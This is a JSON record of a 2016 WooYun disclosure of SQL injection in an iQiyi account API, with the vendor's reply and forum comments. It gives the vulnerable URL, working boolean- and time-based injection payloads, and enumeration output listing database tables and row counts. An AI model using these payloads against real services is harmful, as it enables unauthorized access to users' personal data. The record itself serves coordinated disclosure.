{"id": 86677, "wybug_id": "wooyun-2016-0190648", "wybug_title": "爱奇艺某站SQL注入(一千五百万数据)", "wybug_corp": "奇艺", "wybug_author": "Blcat", "wybug_date": "2016-03-30 10:57", "wybug_open_date": "2016-05-14 11:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-14：\t细节向公众公开  简要描述： 我只是想缓存个电影出去玩的时候看结果吓死本宝宝了 详细说明：  \nhttp://account.iqiyi.com/services/account/info.action?version=1.0.0&uid=1266760165&platform=iphone-iqiyi&access_code=huiyuan&platform_code=bb35a104d95490f6&mix=1&testMode=0\nplatform_code可以注入\n---Parameter: platform_code (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: version=1.0.0&uid=1266760165&platform=iphone-iqiyi&access_code=huiyuan&platform_code=bb35a104d95490f6') AND 2143=2143 AND ('LHks'='LHks&mix=1&testMode=0    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind    Payload: version=1.0.0&uid=1266760165&platform=iphone-iqiyi&access_code=huiyuan&platform_code=bb35a104d95490f6') AND SLEEP(5) AND ('xGQD'='xGQD&mix=1&testMode=0---\n   漏洞证明：  先跑个user\ndatabase management system users [1]:[*] 'qiyiaccount'@'10.11.%'\n再来个database\nDatabase: qiyi_account[54 tables]+---------------------------------+| acc_auth_authority_resource     || account_abnormal                || account_account                 || account_account_ext             || account_account_sub             || account_account_sub_debug       || account_appstore_recharge_count || account_async_task              || account_async_task_processed    || account_audit                   || account_auth_authority          || account_auth_resource           || account_auth_role               || account_auth_role_authority     || account_auth_user               || account_auth_user_authority     || account_auth_user_role          || account_auto_renew              || account_bi_uid                  || account_cash_coupon             || account_cash_coupon_send        || account_dict                    || account_dut_bind_log            || account_dut_pay_type            || account_dut_renew_log           || account_dut_type                || account_dut_user                || account_exception_order         || account_lock                    || account_log_operator            || account_notify_log              || account_order                   || account_recharge_access         || account_recharge_access_channel || account_recharge_access_qd      || account_recharge_channel        || account_recharge_coins          || account_recharge_platform       || account_recharge_qd             || account_recharge_rule           || account_refund_order            || account_security                || account_security_level          || account_security_message        || account_settlement              || account_split_coupon_user       || account_sub_platform            || account_sub_types               || account_test_user               || account_third_order             || account_tracker_code            || account_uid_change              || account_wechat_info             || boss_test_user                  |+---------------------------------+\n随便翻了几个表\nDatabase: qiyi_account+------------------+---------+| Table            | Entries |+------------------+---------+| account_security | 624597  |+------------------+---------+Database: qiyi_account+------------------+---------+| Table            | Entries |+------------------+---------+| account_dut_user | 15509726 |+------------------+---------+\n   修复方案：  估计是拼接sql语句了吧改代码吧   版权声明：转载请注明来源 Blcat@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2016-03-30 11:36 厂商回复： 感谢白帽子的报告，经业务方确认，报告中提到的用户数据已做脱敏处理（泄漏了用户名、邮箱、手机号中间4位加*），此处不涉及到用户密码。  感谢关注爱奇艺PPS安全，我们已着手修复。 最新状态： 2016-03-30：谢谢 @Blcat 的报告，这份报告中提及的1500万数据是第三方同步给爱奇艺的（我们同样有责任和义务保护好这部分数据），库中爱奇艺自身账户体系中的数据是80万。  感谢关注爱奇艺安全  :)  ", "replys": "漏洞评价：\n评价\n     2016-03-30 10:58 |    \t\t马崧耀 \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:13        )\t\t \n  沙发    \n     2016-03-30 10:58 |    \t\t木易 \t\t\t( 普通白帽子  |\t\t\t        Rank:321 漏洞数:65        | 不，，不要误会，我不是针对谁，我是说在座...)\t\t \n  前排开始    \n     2016-03-30 10:58 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:83        | 看似山穷水尽，终将柳暗花明)\t\t \n  不应该啊    \n     2016-03-30 10:59 |    \t\t小博博 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:14        | 工作)\t\t \n  前排    \n     2016-03-30 10:59 |    \t\twater \t\t\t( 普通白帽子  |\t\t\t        Rank:499 漏洞数:155        | If you have one, then we have more than ...)\t\t \n  缓存~~~我觉得这是手机app相关接口的洞    \n     2016-03-30 10:59 |    \t\tHckmaple \t\t\t( 普通白帽子  |\t\t\t        Rank:210 漏洞数:53        | ~~~)\t\t \n  围观    \n     2016-03-30 11:00 |    \t\t狗狗侠  \t\t\t( 普通白帽子  |\t\t\t        Rank:518 漏洞数:58        | 我是狗狗侠)\t\t \n  牛逼。。。。    \n     2016-03-30 11:00 |    \t\t我爱，你老婆 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:15        | 猥琐的猥琐！)\t\t \n  前排 CCAV看这里    \n     2016-03-30 11:01 |    \t\tphoenixne \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:103        | 小本毕业，向各位学习)\t\t \n  觉得 是 缓存的时候爆出了错误信息    \n     2016-03-30 11:03 |    \t\tjust_joker \t\t\t( 普通白帽子  |\t\t\t        Rank:124 漏洞数:22        | ..........)\t\t \n  看片引发的血案。。。    \n     2016-03-30 11:04 |    \t\t啊L川  \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  好low的标题    \n     2016-03-30 11:05 |    \t\tsauce \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:35        | test)\t\t \n  你这运气太好    \n     2016-03-30 11:15 |    \t\tlinkey \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:37        | sqlmap的超爱好者)\t\t \n  坐等公布    \n     2016-03-30 11:19 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:148 漏洞数:65        | 我要是再正常一点就好了)\t\t \n  66666    \n     2016-03-30 11:21 |    \t\t咚咚呛 \t\t\t( 普通白帽子  |\t\t\t        Rank:263 漏洞数:34        | 我是一只小毛驴咿呀咿呀呦~~)\t\t \n  这个6    \n     2016-03-30 11:21 |    \t\t沦沦 \t\t\t( 普通白帽子  |\t\t\t        Rank:647 漏洞数:147        | 爱老婆，爱生活|脚步不能停要一直向前走【...)\t\t \n  @lijiejie    \n     2016-03-30 11:22 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:810 漏洞数:127        | ®高级安全工程师 | WooYun认证√)\t\t \n  @荒废的腰子 互撸娃    \n     2016-03-30 11:31 |    \t\tvon \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:8        | 一个帅字贯穿了我的一生~)\t\t \n  666    \n     2016-03-30 12:28 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2016-03-30 13:20 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:244 漏洞数:91        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  关注    \n     2016-03-30 13:37 |    \t\t小白-x9 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | qq1750996184  14岁学生而已)\t\t \n  围观     \n     2016-03-30 14:28 |    \t\t龚稳 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:18        | 没有做不到的，只有不想做的)\t\t \n  给我来几个月会员    \n     2016-03-30 14:29 |    \t\t龚稳 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:18        | 没有做不到的，只有不想做的)\t\t \n  居然还脱裤了    \n     2016-03-30 16:26 |    \t\t键盘手 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:4        | *V*)\t\t \n  \"这份报告中提及的1500万数据是第三方同步给爱奇艺的\"第三方给你这些数据的时候有没有经过我们客户的同意？非法采集非法交易，是不是涉及法律问题？？？    \n     2016-03-30 16:36 |    \t\t迪南 \t\t\t( 普通白帽子  |\t\t\t        Rank:532 漏洞数:107        | 我真是一个大菜比)\t\t \n  问的好    \n     2016-03-30 17:27 |    \t\t        Jn·  \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:14        | 本小菜很可爱，如果不服你TM来打我啊--哎呀...)\t\t \n  这洞你留多少天啦...我爱奇艺前段时间都发现异地登录...    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}